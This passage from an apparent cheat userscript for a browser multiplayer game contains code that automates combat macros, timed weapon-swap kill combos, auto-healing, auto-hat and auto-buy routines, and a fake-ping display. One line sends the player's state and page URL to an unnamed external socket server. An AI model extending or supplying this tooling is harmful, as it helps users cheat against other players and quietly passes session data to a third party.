            if(e.inTrap) e.inTrap.angToMe = getAimer(E, e.inTrap);
            const dir = getAimer(E, e),distance = dist(E, e);
            if(dist(E,e.np.accel)<dist(E,e)&& dist(e.np.accel,E)<200 &&dAng(getAimer(e,E),e.movDir)<1&& e.movSpd>=114 && E.delta<123&&tick-ltt[e.sid].tick<=1){
                if(utilityType!=null&&R.list[utilityType]?.name == "blocker"&&E.canBuild(R.list[utilityType])){
                    for(let i=0;i<18;i++){
                        Hq(utilityType,dir+toRad(i*20))
                        Hq(utilityType,dir-toRad(i*20))
                    }
                    console.log('anti boost blocker')
               
                } else if(E.canBuild(R.list[spikeType])){
                    Hq(spikeType,dir+toRad(90))
                    Hq(spikeType,dir-toRad(90))
                    Hq(spikeType,dir+toRad(180))
                    console.log('anti boost spike')
            
                } else if(boostType!=null&&E.canBuild(R.list[boostType])){
                    for(let i=0;i<18;i++){
                        Hq(boostType,dir+toRad(i*20))
                        Hq(boostType,dir-toRad(i*20))
                    }
                    console.log('anti boost trap')
                 
                } else{
                    for(let i=0;i<18;i++){
                        Hq(wallType,dir+toRad(i*20))
                        Hq(wallType,dir-toRad(i*20))
                    }
                    console.log('anti boost wall')
                
                }
            }
            if (e.movSpd <= 5 && E.movSpd <= 5 && (e.secondary == 9 || e.secondary == null || e.secondary == undefined) && (distance >= 665 && distance <= 705)) {
                E.antiOneTickBowInsta = true;
            }
        }
    }
    E.dmgpot = dmgpot();




    breakObjs = [];
    dunecodigo()
    ta22()
    breakShit();
    (E.primaryVar > 1 && primary == 5 && secondary == 10) ? breakShit() : spikeTickAids();
    spikeSyncer();
    //daggerKB();
    syncTeam = allies.find(e=>e.sid == teamID)



    whoShot = whoShot.filter(x => tick - x?.tick <= 4)
    //spikeKBTest()
    //E.spikeTrap = null;
    inTrap = false;
    for(let i = nearObjects.length; i--;) {
        if(sqrt((nearObjects[i].x - E.x2) ** 2 + (nearObjects[i].y - E.y2) ** 2) > 350 && (/*!clan(nearObjects[i]?.owner?.sid) &&*/ !(nearObjects[i].dmg || nearObjects[i].trap)
                                                                                           || nearObjects[i]?.type !== 1 && nearObjects[i].y < 12000)) continue;
        if(nearObjects[i].dmg || nearObjects[i]?.type === 1 && nearObjects[i].y >= 12000) {
            nearSpikes.push(nearObjects[i]);
        } else if(nearObjects[i].trap) {
            nearTraps.push(nearObjects[i]);
        }
    }
    for (let i = nearObjects.length; i--;) {
        if ((y = nearObjects[i]).trap) {
            if (sqrt((y.x - E.x2) ** 2 + (y.y - E.y2) ** 2) <= 47 && !clan(y?.owner?.sid)) {
                inTrap = y;
                //ue.checkItemLocation4(E.x2 + cos(t) * i, E.y2 + sin(t) * i, e.scale, .6, n.id,false,n)
                break;
            }
        }
    }
    E.spikeTrap = nearObjects
        .filter(e => inTrap && e?.group?.name === 'spikes' && (nearestenemy && dist(E,nearestenemy)<= 130 && dAng(getAimer(nearestenemy,e),getAimer(nearestenemy,E)) <= 3|| dist(E,e) <= 35 + e.realScale + 2)&& !clan(e.owner.sid) && dist(E, e, 'object') <= (secondary === 10 ? 75 : R.weapons[primary]?.range))
        .sort((a, b) => dist(E, a, 'object') - dist(E, b, 'object'))[0]; // remove [0] for multi spike, and do some editing.
    /*for (let i = nearObjects.length; i--;) {
        if (inTrap && (y = nearObjects[i]).dmg) {
            if ((nearestenemy && sqrt((nearestenemy.x2 - E.x2) ** 2 + (nearestenemy.y2 - E.y2) ** 2) <= 130 && dAng(getAimer(nearestenemy, y), getAimer(nearestenemy, E)) <= 3 || dist(E, y) <= 35 + y.realScale + 2) && !clan(y.owner.sid) && dist(E, y, 'object') <= (secondary === 10 ? 75 : R.weapons[primary]?.range)) {
                E.spikeTrap = y;
                break;
            }
        }
    }*/
    aPush.checked ? autopush() : wyndAP();





    if(document.getElementById("ABS").checked && primary == 5 && secondary == 10 && nearestenemy && !(nearestenemy.inTrap && polePlacer(R.list[spikeType],getAimer(E,nearestenemy.inTrap),nearestenemy.inTrap) && pushing && primary == 5 && E.primaryVar > 0) && !breaking && nreload(nearestenemy) == 1&&!wr_obj&& nearestenemy.weaponR!=1&&!clairo2&&(nearestenemy.weaponIndex<=10&& nearestenemy.weaponIndex!=9&&nearestenemy)){
        if(inrange(E,nearestenemy,R.weapons[secondary].range,true) &&shieldBypass(E,nearestenemy)&& (E.primaryVar >= 1 || E.secondaryVar >= 1 && E.primaryVar < 1 && (tick - nearestenemy?.lastBull) % 9 == 8) && nearestenemy.skinIndex==6&& E.pr==1 && E.sr == 1&&E.tr==1&&nearestenemy){
            visAim = true;
            wr_obj = true;
            hold = secondary
            Hg(53);
            knla.send("z",secondary,true);
            aim[0] = getAimer(E,nearestenemy)
            knla.send("D",aim[0], "client")
            setTimeout(() => {
                hold = primary;
                knla.send("z",primary,true);
                Hg(7);
                aim[0] = getAimer(E,nearestenemy)
                knla.send("D",aim[0], "client")
            }, timeBetweenTick);
            setTimeout(() => {
                wr_obj = false;
                visAim = false;
                aim[0] = null;
            }, timeBetweenTick2)
        }
    }




    if(document.getElementById("appleL").checked && nearestenemy &&!breaking&&!wr_obj&&secondary==10&&primary==5/*&& E.pr==1 &&E.tr==1*/){
        let rr = R.weapons[secondary].range
        if(nearestenemy&&inrange(E,nearestenemy,rr,true)&&nearestenemy&&shieldBypass(E,nearestenemy)&&(tick - nearestenemy?.lastBull) % 9 == 8&&(E.primaryVar==3||E.primaryVar>=2 && E.secondaryVar==3)&& nearestenemy.skinIndex!=6&& E.pr===1 && E.sr===1){
            wr_obj = true
            hold = secondary
            visAim = true
            knla.send("z",secondary,true)
            aim[0] = getAimer(E,nearestenemy)
            Hg(7,18);
            knla.send("D",aim[0], "client")
            setTimeout(() => {
                hold = primary;
                knla.send("z",primary,true)
                Hg(7,18)
                aim[0] = getAimer(E,nearestenemy)
                knla.send("D",aim[0], "client")
            }, timeBetweenTick);
            setTimeout(() => {
                wr_obj = false;
                visAim = false;
                hold = null
            }, timeBetweenTick2)
        }
    }


    serverconnected && socketer.send(JSONStringify({fixer:E, server:location.href, time: Date.now()}));










    turretdoer = renderObjects.filter((b)=>b.name=='turret'&&dist(E,b)<=700+E.movSpd&&b?.time==2200&&!clan(b?.owner?.sid))

    aim[0] = null;
    Mi();
    E.selectedWeapon = null;
    if(inTrap && !wr_obj && !meleesyncing){
        let aimer;
        if(!(E.spikeTrap)){
            aimer = getAimer(E,inTrap)
            E.selectedWeapon = (secondary == 10 && (inTrap.health - (R.weapons[primary].dmg * T.weaponVariants[E.primaryVar].val) <= 0) && (primary == 7 ? true : E.pr === 1));
        } else {
            aimer = getAimer(E,E.spikeTrap);
            E.selectedWeapon = (secondary == 10 && (E.spikeTrap.health - (R.weapons[primary].dmg * T.weaponVariants[E.primaryVar].val) <= 0) && (primary == 7 ? true : E.pr === 1));
            /*let ppa = E.spikeTrap;
            for (let z = 0; z < ppa.length; z++) {
                let obj = ppa[z];
                E.selectedWeapon = (secondary == 10 && (E.spikeTrap.health - (R.weapons[primary].dmg * T.weaponVariants[E.primaryVar].val) <= 0) && (primary == 7 ? true : E.pr === 1));
                let multiTargets = bestAimS(obj, E.selectedWeapon ? R.weapons[primary].range : 75, ppa);
                aimer = multiTargets//getAimer(E,inTrap)
                break;
            }*/
            //aimer = getAimer(E,E.spikeTrap);
        }
        if(E.selectedWeapon ? E.pr === 1 : (E.pr==1&&secondary!=10||E.sr==1&&secondary==10)){
            aim[0] = aimer;
        }
        breakBuild(aimer, E.selectedWeapon ? primary : secondary === 10 ? secondary : primary, E.selectedWeapon ? E.primaryVar : secondary === 10 ? E.secondaryVar : E.primaryVar, E?.dmgpot?.forceSoldier ? 6 : E.selectedWeapon ? 0 : bH.includes(40) ? 40 : 0, 1)
    }
    if(inTrap&&!wr_obj&&!meleesyncing){
        hold = E.selectedWeapon ? primary : secondary!=10?primary:10 
        if(E.selectedWeapon ? E.pr === 1 : (E.sr==1&&secondary==10||E.pr==1&&secondary!=10)){
            Hg(turretdoer.length?22: E?.dmgpot?.forceSoldier ? 6 : E.selectedWeapon ? 6 : 40, 11);
            E.hitting = true;
        }
    }
    if(!wr_obj&&!clairo2&&!meleesyncing){
        if(!inTrap){
            if(keys.lc){
                hold = primary;
                if(E.weaponIndex!=primary||E.buildIndex!=null)knla.send("z",primary,true);
                if(E.pr == 1){
                    if(E.tailIndex===11){
                        //hitPlayer(vs2(), hold, E.primaryVar, E.dmgpot?.soldier ? 6 : turretdoer.length?22:7, 18);
                        storeEquip(bT.includes(18) ? 18 : 0,1)
                    } else{
                        Hg(E.dmgpot?.soldier ? 6 : turretdoer.length?22:7,18)
                        //hitPlayer(vs2(), hold, E.primaryVar, E.dmgpot?.soldier ? 6 : turretdoer.length?22:7, 18);
                    }
                    E.hitting = true;
                }
                breakBuild(vs2(), hold, E.primaryVar, 0, 1)
            }
            if(keys.rc){
                (!keys.ShiftLeft&&secondary==10) ?(hold = secondary):(hold=primary)
                if(E.sr == 1&&secondary==10&&E.weaponIndex==secondary&&!keys.ShiftLeft||E.pr == 1 &&(E.weaponIndex==primary||keys.ShiftLeft)){
                    Hg(E.dmgpot?.soldier ? 6 : turretdoer.length?22:failsafe<2 ?40:7,11,1)
                    E.hitting = true;
                }
                breakBuild(vs2(), hold, hold === 10 ? E.secondaryVar : E.primaryVar, bH.includes(40) ? 40 : 0, 1)
            }
            if(keys.mc){
                for (let z = nearObjects.filter(e => e.health && dist(E, e, "object") <= ((!keys.ShiftLeft && secondary===10?75:R.weapons[primary].range))).sort((a,b)=>fastHypot(E.x2-a.x,E.y2-a.y)-fastHypot(E.x2-b.x,E.y2-a.y)), i = z.length; i--;) {
                    let obj = z[i];
                    let multiTargets = bestAimS(obj,secondary===10?75:R.weapons[primary].range, z);
                    (!keys.ShiftLeft&&secondary==10) ?(hold = secondary):(hold=primary)
                    if(E.sr == 1&&secondary==10&&E.weaponIndex==secondary&&!keys.ShiftLeft||E.pr == 1 &&(E.weaponIndex==primary||keys.ShiftLeft)){
                        Hg(E.dmgpot?.soldier ? 6 : turretdoer.length?22:failsafe<2 ?40:7,11,1)
                        E.hitting = true;
                    }
                    aim[0] = multiTargets;
                    breakBuild(multiTargets, hold, hold === 10 ? E.secondaryVar : E.primaryVar, bH.includes(40) ? 40 : 0, 1)
                    break;
                }
            }
        }


        //.filter(e => keys.rc&&(e.health>10*7.5*3.3*(Variants[E.secondaryVar]||!keys.rc)))


        autohat()

    }


    if(E.lastBull&&bH.includes(7)&&!E.hitSpike&&E.dmgpot?.hp<80&& E.shameCount>0&&E.poison<=0&&!E.dmgpot?.soldier&&E.bleed === 0&&amAlive&&!turretdoer.length&&lastHat!=7){
        if(E.lastDamage==0&&E.skinIndex!=45){
            E.shameLeak = true;
            failsafe++;
            Hg(7,11)
        }
    }
var autoHealer = true;
    if(E.hitSpike && inTrap || !inTrap && E.hitSpike && E?.dmgpot?.shouldHeal){ // added this incase u touch spike and bounce or something, also add soldier mult to the primary i guess, could addd if movSpd is higher than usual an i hit spike, then i assume it could be kb spike
        if((E.health <= E.hitSpike.dmg) || (E.hitSpike.dmg + E?.dmgpot?.primary + E?.dmgpot?.turretGear >= E.health)) Qheal();
    } else if(autoHealer){
        if(E.alive&&E.health<=E.dmgpot?.hp*(E.skinIndex==6&&!E.hitting&&!wr_obj&&!turretdoer.length&&!clairo2&&!E.shameLeak? .75:1)&&E.skinIndex!=45&&E.shameCount<7){
            heal();
        }else if((!sandbox&&(E.health<85||E.shameCount>0&&E.health<100)||sandbox&&Date.now()-E.lastDamage>=100&& E.health<100||sandbox&& E.health<=69)&&amAlive&&E.skinIndex!=45){
            if(E.health<=69){
                setTimeout(() => {
                    heal();
                }, 120-pingavg+9);
            } else {
                heal();
            }
        }
    }



    showPlace = [];
    //  autoplacing = nearObjects.concat(restrictPlace)
    autoplacers();
    autoplacing = nearObjects.concat(restrictPlace);
    if(!wr_obj && !meleesyncing && !clairo2){
        if(aim[0]) visAim = true;
        if(E.dir!=aim[0]&&aim[0]!==null)knla.send("D",aim[0])
        if(hold&&(hold==primary||hold==secondary)&&(E.weaponIndex!=hold||E.buildIndex!=-1))knla.send("z",hold,true);
        if(aim[0]===null&&E.dir!=vs2())knla.send("D",vs2());
    }



    if(E.dmgpots.length>=4) E.dmgpots.pop();
    if(E.dmgpot) E.dmgpots.unshift({ tick:tick&&inTrap});

    lpo[1] = false;
    reload()
    fastwep()
    if(autohit||wr_obj||meleesyncing&&!bowinstaing&&!oneTick||keys.rc||keys.lc||keys.mc||E.hitting||clairo2||breaker){
        if(hitPacket % 2 == 0&&amAlive){
            knla.send("K", 1)
        }
    } else {
        if(hitPacket % 2 == 1){
            knla.send("K", 1)
        }
    }
    miller()
    autobuyer()

}




function aimNextPos(player, target, projSpd, targetSID, amount = 6) {
  let playerPos = player.moveDirection ? bTw(player, player.moveDirection, player, 1).real : player.np.real;
    let positions = {norm:{dir:null,ticks:null,dist:null},marks:{dir:null,ticks:null,dist:null}}
    let fT = Array.isArray(target) ? target : JETXRAH(targetSID, 6)
    for (let x = 0; x < fT.length; x++) {
        let t = {dir:getAimer(playerPos, fT[x].real), dist:dist(playerPos, fT[x].real)-105,position: fT[x]};
        if(calculateFits(t.dist, projSpd * 111) === x && !positions.norm.dir){
            positions.norm.dir = t.dir
            positions.norm.ticks = x
            positions.norm.dist = t.dist + 105
            positions.position = t.position
        }
        if(calculateFits(t.dist, projSpd * 111 * 1.3) === x && !positions.marks.dir){
            positions.marks.dir = t.dir
            positions.marks.ticks = x
            positions.marks.dist = t.dist + 105
            positions.position = t.position
        }
    }
    if(positions.norm.dir || positions.marks.dir) return positions;
    return null;

    function calculateFits(dividend, divisor) {
        if (divisor === 0) {
            throw new Error("Cannot divide by zero.");
        }
        const wholeFits = Math.floor(dividend / divisor);
        const remainder = dividend % divisor;
        const additionalFit = remainder > 0 ? 1 : 0;
        return wholeFits + additionalFit;
    }
}
var g = false;
let forceShadow = false;
function autohat(test, ang = moveDirection){
    if((breaker && !E.dmgpot.soldier && !test)) return;
    let doSoldier = nearestenemy && dist(E,nearestenemy) <= sDist && !E.inWater && strictSoldier.checked ? true : false
    //let doMonkey = 1

    let doMonkey = 11;
    if (g) {
        if (forceShadow) {
            doMonkey = 19;
        } else {
            if (nearestenemy) { // spiketick checker
                if (nearestenemy.inTrap) {
                    if ((nearestenemy.inTrap.health <= (R.weapons[nearestenemy.secondary == 10 ? nearestenemy.secondary : nearestenemy.primary].dmg * 3.3 * (R.weapons[nearestenemy.secondary == 10 ? nearestenemy.secondary : nearestenemy.primary].sDmg || 1)) + (R.weapons[E.secondary == 10 ? E.secondary : E.primary].dmg * 3.3 * (R.weapons[E.secondary == 10 ? E.secondary : E.primary].sDmg || 1)) + (nearestenemy.secondary == 10 ? R.weapons[nearestenemy.primary].dmg : 0)) && E.primary != 7) {
                        doMonkey = 13;
                    }else {
                        if (!rr) rr = [];
                        let s = nearObjects.filter(e => !rr.includes(e.sid) && dist(nearestenemy.inTrap, e) <= 50 + (e.type == 1 ? e.scale * 0.55 : e.scale) + 26 && ((clan(e?.owner?.sid) && e?.group?.name == 'spikes') || (!nearestenemy.team && e?.group?.name == 'spikes' && e?.owner?.sid != nearestenemy.sid) || (e?.type == 1 && e.y >= 12000))).sort((a, b) => dist(a, nearestenemy) - dist(b, nearestenemy));
                        if (s.length) {
                            let prePosEnemy = { x: nearestenemy.x2 + nearestenemy.xVel, y: nearestenemy.y2 + nearestenemy.yVel };
                            let iamgod = false;
                            for (let i = 0; i < s.length; i++) {
                                if (dist(prePosEnemy, s[i]) < s[i].scale + nearestenemy.scale) {
                                    doMonkey = 19;
                                    iamgod = true;
                                }
                            }
                            if (iamgod == false) {
                                doMonkey = 11;
                            }
                        } else {
                            doMonkey = 11;
                        }
                    }
                } else if (2 == 2) {
                    let prePosEnemy = { x: nearestenemy.x2 + nearestenemy.xVel, y: nearestenemy.y2 + nearestenemy.yVel };
                    let prePosPlayer = { x: E.x2 + E.xVel, y: E.y2 + E.yVel };
                    let kbnexttick = onion(nearestenemy, getAimer(prePosPlayer, prePosEnemy), R.weapons[E.primary].knock * R.weapons[E.primary].range + (E.scale * 1.8), false, 1);
                    if (kbnexttick) {
                        doMonkey = 19;
                    } else {
                        doMonkey = 11;
                    }
                }
            } else {
                doMonkey = 11;
            }
        }
    } else {
        doMonkey = nearestenemy && dist(E, nearestenemy) <= sDist && !weaponId ? 19 : 11;
    }


    // let doMonkey = nearestenemy && dist(E,nearestenemy) <= sDist && !strictMonkey.checked ? 19 : 11


    if(!strictSoldier.checked){
        if(E.dmgpot?.add >=100 || E.dmgpot?.secondary >= 100 || E.dmgpot?.soldier || ang === undefined){
            if(test) return {skinIndex:6, tailIndex: weaponId ? 11 : 13}
            // Hg(6, gE('strict monkey')?.checked ? 11 : 19)
            doSoldier = true;
        }
    }


    if(zm.checked||test) {
        if (!E.antiOneTickBowInsta&&E.doAssassin) {
            Hg(56, 0);
            if(test)return {skinIndex:56, tailIndex: 0}
        } else {
            if(!E.antiOneTickBowInsta && !E.hitting && We.style.display == "none" && !bowinstaing){
                if (!turretdoer.length && !(failsafe >= 2 && !E.dmgpot.soldier) && (ang === undefined || doSoldier || inTrap) && !E.doAssassin || !doSoldier && doMonkey === 19) {
                    let wearSkin = 6
                    if(!doSoldier && doMonkey === 19) wearSkin = fastHats(1).skinIndex;
                    if(test)return {skinIndex:wearSkin, tailIndex: doMonkey}
                    Hg(wearSkin, doMonkey);
                } else if (!antiOneTick&&!turretdoer.length && !(failsafe >= 2 && !E.dmgpot.soldier) && !E.doAssassin) {
                    if(test)return fastHats(1);// bh();
                    fastHats()
                } else if (failsafe >= 2 && !E.antiOneTickBowInsta&&!antiOneTick) {
                    // return {skinIndex:7, 11}
                    if(test)return {skinIndex:7,tailIndex:E.tailIndex};
                    Hg(7);
                } else if(!antiOneTick) {
                    if(test)return {skinIndex:22,tailIndex:11};
                    Hg(22, 11);
                }
            }
            if(test)return fastHats(1);
        }
    }
}
function autoHat(test){
    if(forceHat){
        Hg(forceHat)
    }

}

function findPlayerID(e) {
    for (let t = 0; t < J.length; ++t)
        if (J[t].id == e)
            return J[t];
    return null
}
function findPlayerSID(e) {
    for (let t = 0; t < J.length; ++t)
        if (J[t].sid == e)
            return J[t];
    return null
}
function zo(e) {
    for (let t = 0; t < ye.length; ++t)
        if (ye[t].sid == e)
            return ye[t];
    return null
}
function findBuildingBySID(e) {
    for (let i = et.length; i--;) {
        if (et[i].sid === e) {
            return et[i];
        }
    }
    return null;
}

let Fo = -1;
// Get the fake ping checkbox
const fakePingCheckbox = document.getElementById("fakePing");; // Assuming 'fakePing' is the id of your checkbox

// Add event listener to toggle slider visibility
fakePingCheckbox.addEventListener('change', function() {
    const sliderContainer = document.getElementById('sliderContainer');
    if (this.checked) {
        sliderContainer.style.display = 'block';
    } else {
        sliderContainer.style.display = 'none';
    }
});

// Get the slider and its value display element
const pingSlider = document.getElementById('pingSlider');
const pingSliderValue = document.getElementById('pingSliderValue');

// Add event listener to update the value display when slider value changes
pingSlider.addEventListener('input', function() {
    pingSliderValue.innerText = this.value;
});

const hidePingCheckbox = false; //gE('Hide Ping'); // Assuming 'Hide Ping' is the id of your checkbox

function pingSocketResponse() {
    const e = Date.now() - Fo;
    window.pingTime = e;
    pingval = e;

    if (!hidePingCheckbox || !hidePingCheckbox.checked) {
        if (!fakePingCheckbox.checked) {
            io = e;
        } else {
            const sliderValue = parseInt(pingSlider.value);
            io = floor(Math.random() * sliderValue) + parseInt(pingSlider.value) + 90;
        }
        Qt.innerText = e + ('') + ' ms';
        pingarr.push(e);
        if (pingarr.length >= 4) {
            pingarr.shift();
        }
        pingavg = pingarr.reduce((a, b) => a + b, 0) / pingarr.length;
    } else {
        Qt.innerText = "Hidden";
    }
}



let Pn;
function Vo() {
    Pn && clearTimeout(Pn),
        cs() && (Fo = Date.now(),
                 knla.send("0")),
        Pn = setTimeout(Vo, 400)
}
function serverShutdown(e) {
    if (e < 0)
        return;
    const t = floor(e / 60);
    let i = e % 60;
    i = ("0" + i).slice(-2),
        dr.innerText = "Server restarting in " + t + ":" + i,
        dr.hidden = !1
}
/*window.requestAnimFrame = function () {
    return null;
};*/
window.requestAFrame = function() {
    return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || function(e) {
        window.setTimeout(e, 1e3 / 60)
    }
}();
function Uo() {
    It = Date.now(),
        be = It - or,
        or = It,
        Of(),
        requestAFrame(Uo)
}
Nf();
Uo();
function Lo(e) {
    window.open(e, "_blank")
}
window.openLink = Lo;
window.aJoinReq = handleClanRequest;
window.follmoo = Bh;
window.kickFromClan = kickPlayer;
window.sendJoin = sendClanRequest;
window.leaveAlliance = leaveClan;
window.createAlliance = createClan;
window.storeBuy = storeBuy;
window.storeEquip = storeEquip;
window.showItemInfo = Se;
window.selectSkinColor = selectSkinColor;
window.changeStoreIndex = cf;
window.config = T;


var abInsta = true;
async function ta22(e){
    if(!nearestenemy||primary!=5||E.tr!=1||E.pr!=1||wr_obj||breaking||!abInsta) return
    if(nearestenemy&&inrange(E,nearestenemy,R.weapons[primary].range,true)&&shieldBypass(E,nearestenemy)&&!nearestenemy?.inTrap){
        //console.log('can')
        //wr_obj = true;
        let e = [onion(nearestenemy,getAimer(E.np.real,nearestenemy.np.real),dist(nearestenemy,nearestenemy.KB.fpriTKB),true,1),onion(nearestenemy,getAimer(E.np.real,nearestenemy.np.real),dist(nearestenemy,nearestenemy.KB.fsecKB),true,1)]

        if(!e[0]) return;
        let obj = { newPos: {...nearestenemy}}
        let distance = fastHypot(nearestenemy.np.real.x-e[0].x, nearestenemy.np.real.y - e[0].y)//dist2(enemy,objs[i])
        let closestPoint = calcPoint(nearestenemy.np.real.x, nearestenemy.np.real.y, getAimer(E,nearestenemy), min(distance, 170))
        obj.newPos.NEWX = closestPoint.x;
        obj.newPos.NEWY = closestPoint.y;
        obj.originDir = getAimer(E,nearestenemy);
        obj.newPos.dstSpd = distance;
        obj.newPos.static = true;;
        obj.newPos.expire = 3;
        KB(obj.newPos);
  
        oneTick = true;
        wr_obj = true;
        Hg(53,11)
    
        aim[0] = getAimer(E,nearestenemy)
        visAim = true;
      
        knla.send("z",secondary,true)
        hold = secondary
        
        await nextTick();
        if(nearestenemy){
            wr_obj = true;
            oneTick = false;
            hold = primary
            knla.send("z",primary,true)
            aim[0] = getAimer(E,nearestenemy);
            knla.send("D",getAimer(E,nearestenemy), "client");
            Hg(7,18);
        } else {
            wr_obj = false
            return
        }
        await nextTick();
        wr_obj = false;
    }
}





function toRad(degree) {
    return degree * (PI / 180);
}
function toDeg(radians) {
    return radians * 180 / PI;
}


var primary,secondary,foodType,wallType,spikeType,millType,mineType,boostType,spawnpadType,utilityType,clanMates=[]
function isElementVisible(e) {
    return (e.offsetParent !== null);
}
function gE(e) {
    return document.getElementById(e)
}
function clan(e){
    if(e == E.sid)return true
    for(let i = 0; i < clanMates.length; i += 2){
        if(e == clanMates[i]) return true
    };
    return false;
}
function getInventory() {
    primary=null;
    foodType = null;
    secondary = null;
    mineType = null;
    wallType = null;
    spikeType = null;
    millType = null;
    spawnpadType = null;
    utilityType = null;
    for (let i=0;i<9;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i))){
            primary = i;
        }
    }

    for (let i=9;i<16;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i))){
            secondary = i;
        }
    }

    for (let i=16;i<19;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i))){
            foodType = i - 16;
        }
    }

    for (let i=19;i<22;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i))){
            wallType = i - 16;
        }
    }

    for (let i=22;i<26;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i))){
            spikeType = i - 16;
        }
    }

    for (let i=26;i<29;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i))){
            millType = i - 16;
        }
    }

    for (let i=29;i<31;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i))){
            mineType = i - 16;
        }
    }

    for (let i=31;i<33;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i))){
            boostType = i - 16;
        }
    }
    //11 is sapling
    if (isElementVisible(document.getElementById("actionBarItem" + 36))){
        spawnpadType = 36 - 16;
    }

    for (let i=33;i<39;i++){
        if (isElementVisible(document.getElementById("actionBarItem" + i)) && i != 36){
            utilityType = i - 16;
        }
    }
    //console.log(isElementVisible(document.getElementById("actionBarItem" + String(wallType+16))))
    function e(e) {
        return null !== e.offsetParent
    }
    !secondary && (ww=primary)
}








function reloadWeapon(_){

    if(_ ===null) return;
    if(_.buildIndex == -1) {
        if(_.weaponIndex <= 8) {
            let { speed } = R.weapons[_.primary];
            _.pr = min(1, _.pr + ((_.delta>190) ? _.delta : timeBetweenTick) / (speed * _.samRP));
        }else if(_.weaponIndex > 8) {
            let { speed } = R.weapons[_.secondary];
            _.sr = min(1, _.sr + ((_.delta>190)? _.delta: timeBetweenTick) / (speed * _.samRS));
        }
    }
    _.tr = min(1, _.tr+_.delta/2400);
    primaryReloads[_.sid] = _.pr;
    secondaryReloads[_.sid] = _.sr;
    turretReloads[_.sid] = _.tr
    if(_.sid != E.sid) {
        if(!_.hasSoldier && _.skinIndex == 6) {
            _.hasSoldier = true;
        }
        if(!_.hasTank && _.skinIndex == 40) {
            _.hasTank = true;
        }
    }
}








function reloadFailSafe(_){
    for(let i=0;i<J.length;i++){
        if(!J[i].visible&&J[i].sid!=E.sid){
            _ = J[i]
            //  console.log(pThisTick[i])
            _.pr!=undefined&&_.pr!== 1&&( _.pr = min(1, _.pr + timeBetweenTick/(R.weapons[_?.primary]?.speed * _.samRP)));
            _.sr!=undefined&&_.sr!== 1&&(_.sr = min(1, _.sr + timeBetweenTick/(R.weapons[_?.secondary]?.speed * _.samRS)));
            _.tr!=undefined&&_.tr!==1&&(_.tr = min(1, _.tr + timeBetweenTick/2500));

            primaryReloads[_.sid] = _.pr
            secondaryReloads[_.sid] = _.sr
            turretReloads[_.sid] = _.tr
        } //else{console.log("fail")}
        //}
    }
}





function getEuclideanDistance(node1, node2){
    return dist(node1,node2)//Math.sqrt(Math.pow(node1.x - node2.x, 2) + Math.pow(node1.y - node2.y, 2));
}

function getDistance(nodeA, nodeB) {
    return abs(nodeA.x - nodeB.x) + abs(nodeA.y - nodeB.y);
}






function dAng(ang1, ang2){
    let d = abs(ang1 - ang2);
    d = d % PI2;
    if(d > PI){
        d = PI2 - d;
    }
    // console.log(d);
    return d;
}




function autobuyer(){
    if(bH.length+bT.length>=66||!amAlive||!sandbox||We.style.display!="none") return;
    if(buyer.length){
        if(!Array.isArray(buyer[0]) && E.points>=Xt.find(e => e.id==buyer[0]).price) storeBuy(buyer[0],0);
        if(Array.isArray(buyer[0]) && E.points>=Gt.find(e => e.id==buyer[0][0]).price) storeBuy(buyer[0][0],1);
    }
    if(buyer.length==0&&bH.length!=Xt.length-1){
        let hat = Xt.find(e => e.id!=45 && !bH.includes(e.id)&&E.points>=e.price)
        if(hat) storeBuy(hat.id,0);
        let acc = Gt.find(e => !bT.includes(e.id)&&E.points>=e.price)
        if(acc) storeBuy(acc.id,1);
    }
}




function avgAng(a1, a2) {
    const r1 = a1 * (PI / 180);
    const r2 = a2 * (PI / 180);
    const aR = (r1 + r2) / 2;
    let aA = aR % PI2;
    if (aA < 0) {
        aA += PI2;
    }
    aA = aA * (180 / PI);
    return aA;
}



var dopushcalc = false
async function getPush(e,ang,x,y,x2,y2,abs = Math.abs,r = Math.round){
    if(!nearestenemy||dopushcalc) return;
    let di = getAimer(E,nearestenemy),
        fp = bTw(E,di),
        dir = getAimer(fp.accel,nearestenemy),
        xV = fp.accel.x - nearestenemy.x2,
        yV = fp.accel.y - nearestenemy.y2,
        dist4 = dist(fp.accel,nearestenemy);
    knla.send("9",di, "client")
    if(abs(xV) <= 70 || abs(yV) <= 70){
        const distanceSquared = xV * xV + yV * yV;
        var eR = Math.sqrt(distanceSquared) - 70;
        if(eR <= 0){
            dopushcalc = true;
            eR = eR * -.5
            x = nearestenemy.x2 - eR * Math.cos(dir)
            y = nearestenemy.y2 - eR * Math.sin(dir)
            x2 = x + eR * Math.cos(dir)
            y2 = y + eR * Math.sin(dir)
            console.log({x:x,y:y},{x:x2,y:y2},'did',tick)
            console.log(r(nearestenemy.movSpd),r(E.movSpd),eR)
            //return {x:x,y:y}
        }
    }
    await nextTick()
    console.log(dist({x,y},nearestenemy))
    dopushcalc = false;
    //  console.log({x:nearestenemy.x2,y:nearestenemy.y2},{x:E.x2,y:E.y2},tick)
    console.log('_____________________________')

    //  return false;
    /*if (o.getDistance(e.x, e.y, t.x, t.y), t.isPlayer ? (f = -1 * f / 2, e.x += f *
                                r(d), e.y += f * s(d),
                                t.x -= f * r(d),
                                t.y -= f * s(d)) :
                                (e.x = t.x + u * r(d),
                                e.y = t.y + u * s(d),
                                e.xVel *= .75, e
                                .yVel *= .75)*/
}
function Hg(e, t){
    if(!isNaN(e)){
        if(!bH.includes(e)){
            if(lastHat!=0) storeEquip(0, 0),skin=0, nHat = 0;
        } else{
            if(lastHat!=e)storeEquip(e, 0),skin = e, nHat = e;
        }
    }
    if(!isNaN(t)){
        if(!bT.includes(t)){
            if(lastTail!=0)storeEquip(0, 1),tail=0, nTail = 0;
        }else{
            if(lastTail!=t)storeEquip(t, 1),tail=t, nTail = t;
        }
    }
}




function distance(a, b){
    if(a.x2&&b.x2)return sqrt(pow((b.y2-a.y2), 2) + pow((b.x2-a.x2), 2));
    if(!a.x2==undefined && !b.x2)return sqrt(pow((b.y-a.y), 2) + pow((b.x-a.x), 2));
    if(a.x2 && !b.x2)return sqrt(pow((b.y-a.y2), 2) + pow((b.x-a.x2), 2));
